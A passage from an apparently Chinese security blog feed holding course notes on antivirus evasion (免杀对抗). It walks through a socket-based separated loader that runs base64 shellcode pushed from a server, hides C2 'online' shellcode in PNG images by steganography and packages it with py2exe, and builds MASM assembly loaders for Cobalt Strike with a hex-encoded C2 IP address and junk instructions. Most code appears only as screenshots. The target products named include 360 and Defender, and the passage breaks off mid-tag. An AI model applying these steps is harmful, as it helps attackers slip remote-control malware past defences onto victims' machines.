src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114619141.png" alt="image-20230508114619141"></p><h6 id="尝试执行一个ver-会显示其主机版本"><a href="#尝试执行一个ver-会显示其主机版本" class="headerlink" title="尝试执行一个ver,会显示其主机版本"></a>尝试执行一个ver,会显示其主机版本</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114715570.png" alt="image-20230508114715570"></p><h6 id="同时服务端也会接收到其执行的命令"><a href="#同时服务端也会接收到其执行的命令" class="headerlink" title="同时服务端也会接收到其执行的命令"></a>同时服务端也会接收到其执行的命令</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114648647.png" alt="image-20230508114648647"></p><h5 id="下面进行socket执行上线代码："><a href="#下面进行socket执行上线代码：" class="headerlink" title="@下面进行socket执行上线代码："></a>@下面进行socket执行上线代码：</h5><p>首先上面的原型代码是执行cmd命令的代码</p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508115021610.png" alt="image-20230508115021610"></p><h6 id="将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc-x3D-base64-b64decode-data-下面就是data未编码之前将要传入的数据"><a href="#将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc-x3D-base64-b64decode-data-下面就是data未编码之前将要传入的数据" class="headerlink" title="将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc&#x3D;base64.b64decode(data)下面就是data未编码之前将要传入的数据"></a>将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc&#x3D;base64.b64decode(data)下面就是data未编码之前将要传入的数据</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151327660.png" alt="image-20230510151327660"></p><h6 id="去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入"><a href="#去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入" class="headerlink" title="去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入"></a>去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510145429276.png" alt="image-20230510145429276"></p><h6 id="将data上线代码编码"><a href="#将data上线代码编码" class="headerlink" title="将data上线代码编码"></a>将data上线代码编码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151832027.png" alt="image-20230510151832027"></p><h6 id="输入数据以后执行出现了错误，超出了长度"><a href="#输入数据以后执行出现了错误，超出了长度" class="headerlink" title="输入数据以后执行出现了错误，超出了长度"></a>输入数据以后执行出现了错误，超出了长度</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151942915.png" alt="image-20230510151942915"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151636123.png" alt="image-20230510151636123"></p><h6 id="在服务端代码里面data接上没有被接收的余下代码"><a href="#在服务端代码里面data接上没有被接收的余下代码" class="headerlink" title="在服务端代码里面data接上没有被接收的余下代码"></a>在服务端代码里面data接上没有被接收的余下代码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510152930011.png" alt="image-20230510152930011"></p><h6 id="再次执行后上线成功"><a href="#再次执行后上线成功" class="headerlink" title="再次执行后上线成功"></a>再次执行后上线成功</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153003484.png" alt="image-20230510153003484"></p><h6 id="这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0-0-0-0，要不然可能无法上线-，因为主机可能有多个网卡，就无法上线，所以输入0-0-0-0监听任意网卡"><a href="#这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0-0-0-0，要不然可能无法上线-，因为主机可能有多个网卡，就无法上线，所以输入0-0-0-0监听任意网卡" class="headerlink" title="这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0.0.0.0，要不然可能无法上线 ，因为主机可能有多个网卡，就无法上线，所以输入0.0.0.0监听任意网卡"></a>这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0.0.0.0，要不然可能无法上线 ，因为主机可能有多个网卡，就无法上线，所以输入0.0.0.0监听任意网卡</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153518340.png" alt="image-20230510153518340"></p><h6 id="最后上线成功"><a href="#最后上线成功" class="headerlink" title="最后上线成功"></a>最后上线成功</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153744234.png" alt="image-20230510153744234"></p><h3 id="Python-Images-将shellcode隐写进图片内"><a href="#Python-Images-将shellcode隐写进图片内" class="headerlink" title="#Python-Images-将shellcode隐写进图片内"></a>#Python-Images-将shellcode隐写进图片内</h3><p>参考：<a href="https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw">Python3 图片隐写术的实现 (qq.com)</a></p><p><code>加密:RGBAencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])</code></p><p><code>解密：im = Image.open(arguments[&#39;&lt;encodedImage&gt;&#39;])</code></p><p><strong>image-1.py：</strong></p><h6 id="将链接里面的代码复制下来，命名为image-1-py"><a href="#将链接里面的代码复制下来，命名为image-1-py" class="headerlink" title="将链接里面的代码复制下来，命名为image-1.py"></a>将链接里面的代码复制下来，命名为image-1.py</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154650221.png" alt="image-20230510154650221"></p><h6 id="找一张图片，需要png格式的"><a href="#找一张图片，需要png格式的" class="headerlink" title="找一张图片，需要png格式的"></a>找一张图片，需要png格式的</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154829809.png" alt="image-20230510154829809"></p><h6 id="用脚本进行加密-e加密-d解密"><a href="#用脚本进行加密-e加密-d解密" class="headerlink" title="用脚本进行加密 -e加密 -d解密"></a>用脚本进行加密 -e加密 -d解密</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154936688.png" alt="image-20230510154936688"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155055736.png" alt="image-20230510155055736"></p><h6 id="发现隐写的图片变小了"><a href="#发现隐写的图片变小了" class="headerlink" title="发现隐写的图片变小了"></a>发现隐写的图片变小了</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155137243.png" alt="image-20230510155137243"></p><h6 id="所以可以将上线代码作为加密密文"><a href="#所以可以将上线代码作为加密密文" class="headerlink" title="所以可以将上线代码作为加密密文"></a>所以可以将上线代码作为加密密文</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511010931648.png" alt="image-20230511010931648"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511010843707.png" alt="image-20230511010843707"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511011347615.png" alt="image-20230511011347615"></p><h6 id="修改为"><a href="#修改为" class="headerlink" title="修改为"></a>修改为</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511011456854.png" alt="image-20230511011456854"></p><h6 id="在image-1-py中，ctrl-f搜索解密函数RGBAdecodeImage-其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可"><a href="#在image-1-py中，ctrl-f搜索解密函数RGBAdecodeImage-其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可" class="headerlink" title="在image-1.py中，ctrl+f搜索解密函数RGBAdecodeImage,其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可"></a>在image-1.py中，ctrl+f搜索解密函数RGBAdecodeImage,其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可</h6><h6 id="因为图片里面只需要有解码功能，将里面的shellcode解码执行即可"><a href="#因为图片里面只需要有解码功能，将里面的shellcode解码执行即可" class="headerlink" title="因为图片里面只需要有解码功能，将里面的shellcode解码执行即可"></a>因为图片里面只需要有解码功能，将里面的shellcode解码执行即可</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510215524184.png" alt="image-20230510215524184"></p><h6 id="执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了"><a href="#执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了" class="headerlink" title="执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了"></a>执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155900530.png" alt="image-20230510155900530"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510160014845.png" alt="image-20230510160014845"></p><h6 id="再次执行成功上线"><a href="#再次执行成功上线" class="headerlink" title="再次执行成功上线"></a>再次执行成功上线</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510222338649.png" alt="image-20230510222338649"></p><p><strong>image-2.py：</strong></p><h6 id="image-2-py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文"><a href="#image-2-py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文" class="headerlink" title="image-2.py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文"></a>image-2.py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511012856974.png" alt="image-20230511012856974"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511005141627.png" alt="image-20230511005141627"></p><h6 id="执行上面的命令"><a href="#执行上面的命令" class="headerlink" title="执行上面的命令"></a>执行上面的命令</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511005300451.png" alt="image-20230511005300451"></p><h6 id="解密了随之也就上线成功，可以进行py2exe打包"><a href="#解密了随之也就上线成功，可以进行py2exe打包" class="headerlink" title="解密了随之也就上线成功，可以进行py2exe打包"></a>解密了随之也就上线成功，可以进行py2exe打包</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511084706895.png" alt="image-20230511084706895"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</title>
    <link href="http://example.com/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/"/>
    <id>http://example.com/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/</id>
    <published>2023-04-27T00:34:28.000Z</published>
    <updated>2023-05-06T12:59:26.846Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/8i3IGPgDn9GeJQ6a1zq34Q.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、ASM-CS-单汇编&amp;内联C</p><p>2、JAVA-MSF-源码修改&amp;打包</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS</h4><h4 id="➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF"><a href="#➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF" class="headerlink" title="➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF"></a>➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF</h4></blockquote><h3 id="ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="#ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>#ASM-ShellCode-纯汇编&amp;内联C混编-CS</h3><h5 id="1、编译汇编代码实现CS免杀"><a href="#1、编译汇编代码实现CS免杀" class="headerlink" title="1、编译汇编代码实现CS免杀"></a>1、编译汇编代码实现CS免杀</h5><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093005342.png" alt="image-20230504093005342"></p><p>来源：<a href="https://forum.butian.net/share/1536">奇安信攻防社区-编译汇编代码实现免杀 (butian.net)</a></p><p>IP地址：</p><p>30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h</p><p>10.130.4.204</p><p>30&#x3D;1，2f&#x3D;0，2d&#x3D;.，32&#x3D;3，33&#x3D;4，31&#x3D;2 依次内推</p><p>47.94.236.117</p><p>33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h</p><p>端口：82&#x3D;52h 88&#x3D;28h</p><p>编译器下载：<a href="https://www.masm32.com/">https://www.masm32.com/</a></p><p>编译为obj文件：ml &#x2F;c &#x2F;coff &#x2F;Cp test.asm</p><p>生成exe文件：link &#x2F;subsystem:console &#x2F;libpath:c:\masm32\lib test.obj</p><h5 id="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"><a href="#2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）" class="headerlink" title="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"></a>2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）</h5><ul><li><h5 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h5></li></ul><h6 id="把软件拖进去查看入口点"><a href="#把软件拖进去查看入口点" class="headerlink" title="把软件拖进去查看入口点"></a>把软件拖进去查看入口点</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506204759807.png" alt="image-20230506204759807"></p><h6 id="将上面的二进制入口点数据替换到此处"><a href="#将上面的二进制入口点数据替换到此处" class="headerlink" title="将上面的二进制入口点数据替换到此处"></a>将上面的二进制入口点数据替换到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205016545.png" alt="image-20230506205016545"></p><h6 id="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"><a href="#替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处" class="headerlink" 